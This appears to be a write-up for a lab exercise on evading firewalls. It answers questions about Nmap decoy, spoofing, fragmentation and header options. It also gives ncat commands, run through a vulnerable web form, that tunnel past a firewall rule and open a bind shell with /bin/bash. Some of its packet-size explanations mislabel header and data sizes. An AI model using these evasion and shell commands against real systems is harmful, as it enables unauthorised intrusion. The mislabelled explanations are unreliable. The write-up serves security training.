
# Writeup for RedTeamFirewalls

### Task 3 Evasion via Controlling the Source MAC/IP/Port

> What is the size of the IP packet when using a default Nmap stealth (SYN) scan?
Add the size of the TCP header and the IP header to find the total size of the packet. 

`24` + `20` = `44`

> How many bytes does the TCP segment hold in its data field when using a default Nmap stealth (SYN) scan?

A default SYN scan holds `0` bytes in its data field.

> Approximately, how many packets do you expect Nmap to send when running the command ```nmap -sS -F MACHINE_IP```? Approximate to the nearest 100, such as 100, 200, 300, etc.

The answer is `200` packets. -F Scans the top 100 ports and each port is expected to recieve 2 SYN packets.

> Approximately, how many packets do you expect Nmap to send when running the command nmap -sS -Pn -D RND,10.10.55.33,ME,RND -F MACHINE_IP? Approximate to the nearest 100, such as 100, 200, 300, etc.

2 packets per port (because of SYN scan) * 100 ports * 4 IPs = `800`

> What do you expect the target to see as the source of the scan when you run the command nmap -sS -Pn --proxies 10.10.13.37 MACHINE_IP

`10.10.13.37`

> What company has registered the following Organizationally Unique Identifier (OUI), i.e., the first 24 bits of a MAC address, 00:02:DC?

Lookup `00:02:DC` on https://macaddress.io/ the answer is `Fujitsu General Ltd`

> To mislead the opponent, you decided to make your port scans appear as if coming from a local access point that has the IP address 10.10.0.254. What option needs to be added to your Nmap command to spoof your address accordingly?

`-S 10.10.0.254`

> You decide to use Nmap to scan for open UDP ports. You notice that using nmap -sU -F MACHINE_IP to discover the open common UDP ports won’t give you any meaningful results. What do you need to add to your Nmap command to set the source port number to 53?

`-g 53`

### Task 4 Evasion via Forcing Fragmentation, MTU, and Data Length

> What is the size of the IP packet when running Nmap with the -f option?

`8` (fragmented TCP header) + `20` (size of data fragment) = `28`

> What is the maximum size of the IP packet when running Nmap with the -ff option?

`16` (fragmented TCP header) + `20` (size of data fragment) = `36`

> What is the maximum size of the IP packet when running Nmap with --mtu 36 option?

`36` (fragmented TCP header) + `20` (size of data fragment) = `56`
 
> What is the maximum size of the IP packet when running Nmap with --data-length 128 option?

`128` (fragmented TCP header) + `20` (size of data fragment) = `148`

### Task 5 Evasion via Modifying Header Fields

> Scan the attached MS Windows machine using --ttl 2 option. How many ports appear to be open?

`3`

> Scan the attached MS Windows machine using the --badsum option. How many ports appear to be open?

`0`

> Using this simple technique, discover which port number is reachable from the protected system.

`nc -lvnp 1025` on Attacker Machine, `nc AttkIP 21` on target machine.

Answer is `21`

> We have a web server listening on the HTTP port, 80. The firewall is blocking traffic to port 80 from the untrusted network; however, we have discovered that traffic to TCP port 8008 is not blocked. We’re continuing to use the web-form from Task 6 to set up the ncat listener that forwards the packets received to the forwarded port. Using port tunneling, browse to the web server and retrieve the flag.

1. On the vulnerable web form, execute `ncat -lvnp 8008 -c "ncat localhost 80"`
2. On the Attack Machine, execute `nc 10.10.175.124 8008`
3. Perform a `GET /` request from the netcat terminal on the Attack Machine to the Target to display the flag.

### Task 8

> We’re continuing to use the web-form from Task 6 to set up the ncat listener. Knowing that the firewall does not block packets to destination port 8081, use ncat to listen for incoming connections and execute Bash shell. Use the AttackBox to connect to the listening shell. What is the user name associated with which you are logged in?

1. On the vulnerable web form, execute `ncat -lvnp 8081 -e /bin/bash`
2. On the Attack Machine, execute `ncat 10.10.175.124 8081`
3. Execute `whoami` on the netcat terminal on the attack machine to get the username

### Task 9

> What is the number of the highest OSI layer that an NGFW can process?

`7`
